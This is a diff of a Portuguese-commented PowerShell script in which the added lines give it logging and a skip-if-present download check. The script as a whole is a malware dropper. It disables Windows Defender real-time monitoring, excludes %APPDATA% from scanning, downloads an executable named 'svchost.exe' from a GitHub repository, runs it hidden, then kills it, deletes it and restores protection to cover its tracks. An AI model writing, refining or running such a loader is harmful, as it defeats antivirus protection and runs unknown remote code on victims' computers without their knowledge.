@@ -1,25 +1,34 @@
-# Verificar se o script está rodando como administrador
+# Verificar privilégios de administrador
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     Write-Error "Este script requer privilégios administrativos. Execute-o como administrador."
     exit 1
 }
 
+# Configurar log
+$logFile = "$env:TEMP\script_log.txt"
+function Write-Log ($message) {
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    "$timestamp - $message" | Out-File -FilePath $logFile -Append
+}
+
+Write-Log "Script iniciado."
+
 # Desativar monitoramento em tempo real do Windows Defender
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
-    Write-Host "Monitoramento em tempo real desativado."
+    Write-Log "Monitoramento em tempo real desativado."
 } catch {
-    Write-Error "Erro ao desativar o monitoramento em tempo real: $_"
+    Write-Log "Erro ao desativar monitoramento: $_"
     exit 1
 }
 
-# Adicionar exclusão de caminho no Windows Defender
+# Adicionar exclusão de caminho
 try {
     Add-MpPreference -ExclusionPath "$env:APPDATA" -ErrorAction Stop
-    Write-Host "Caminho $env:APPDATA adicionado às exclusões do Windows Defender."
+    Write-Log "Caminho $env:APPDATA adicionado às exclusões."
 } catch {
-    Write-Error "Erro ao adicionar exclusão de caminho: $_"
+    Write-Log "Erro ao adicionar exclusão: $_"
     exit 1
 }
 
@@ -28,68 +37,71 @@ $workDir = "$env:APPDATA\dump"
 try {
     if (-not (Test-Path $workDir)) {
         New-Item -Path $workDir -ItemType Directory -ErrorAction Stop | Out-Null
-        Write-Host "Diretório $workDir criado."
+        Write-Log "Diretório $workDir criado."
     } else {
-        Write-Host "Diretório $workDir já existe."
+        Write-Log "Diretório $workDir já existe."
     }
     Set-Location $workDir
 } catch {
-    Write-Error "Erro ao criar ou acessar o diretório $workDir: $_"
+    Write-Log "Erro ao criar diretório: $_"
     exit 1
 }
 
-# Baixar o arquivo
+# Baixar arquivo com validação
 $fileUrl = "https://github.com/user337666/brow666/raw/refs/heads/main/svchost.exe"
 $filePath = "$workDir\svchost.exe"
-try {
-    Invoke-WebRequest -Uri $fileUrl -OutFile $filePath -ErrorAction Stop
-    Write-Host "Arquivo baixado com sucesso em $filePath."
-} catch {
-    Write-Error "Erro ao baixar o arquivo: $_"
-    exit 1
+if (Test-Path $filePath) {
+    Write-Log "Arquivo $filePath já existe, pulando download."
+} else {
+    try {
+        Invoke-WebRequest -Uri $fileUrl -OutFile $filePath -ErrorAction Stop
+        Write-Log "Arquivo baixado em $filePath."
+    } catch {
+        Write-Log "Erro ao baixar arquivo: $_"
+        exit 1
+    }
 }
 
-# Executar o arquivo
+# Executar arquivo com verificação
 try {
     if (Test-Path $filePath) {
-        Start-Process -FilePath $filePath -WindowStyle Hidden -ErrorAction Stop
-        Write-Host "Arquivo $filePath executado."
+        Start-Process -FilePath $filePath -WindowStyle Hidden -ErrorAction Stop -PassThru | Out-Null
+        Write-Log "Arquivo $filePath executado."
     } else {
-        Write-Error "Arquivo $filePath não encontrado."
+        Write-Log "Arquivo $filePath não encontrado."
         exit 1
     }
 } catch {
-    Write-Error "Erro ao executar o arquivo: $_"
+    Write-Log "Erro ao executar arquivo: $_"
     exit 1
 }
 
-# Aguardar 6 segundos
+# Aguardar e encerrar processo
 Start-Sleep -Seconds 6
-
-# Tentar encerrar o processo (caso ainda esteja em execução)
 try {
     $processName = [System.IO.Path]::GetFileNameWithoutExtension($filePath)
     Stop-Process -Name $processName -Force -ErrorAction SilentlyContinue
-    Write-Host "Processo $processName encerrado, se estava em execução."
+    Write-Log "Processo $processName encerrado."
 } catch {
-    Write-Warning "Não foi possível encerrar o processo $processName: $_"
+    Write-Log "Erro ao encerrar processo: $_"
 }
 
-# Remover o arquivo baixado
+# Remover arquivo
 try {
     if (Test-Path $filePath) {
         Remove-Item -Path $filePath -Force -ErrorAction Stop
-        Write-Host "Arquivo $filePath removido."
+        Write-Log "Arquivo $filePath removido."
     }
 } catch {
-    Write-Error "Erro ao remover o arquivo $filePath: $_"
-    exit 1
+    Write-Log "Erro ao remover arquivo: $_"
 }
 
-# Restaurar monitoramento em tempo real do Windows Defender
+# Restaurar monitoramento
 try {
     Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction Stop
-    Write-Host "Monitoramento em tempo real restaurado."
+    Write-Log "Monitoramento restaurado."
 } catch {
-    Write-Warning "Erro ao restaurar o monitoramento em tempo real: $_"
+    Write-Log "Erro ao restaurar monitoramento: $_"
 }
+
+Write-Log "Script finalizado."
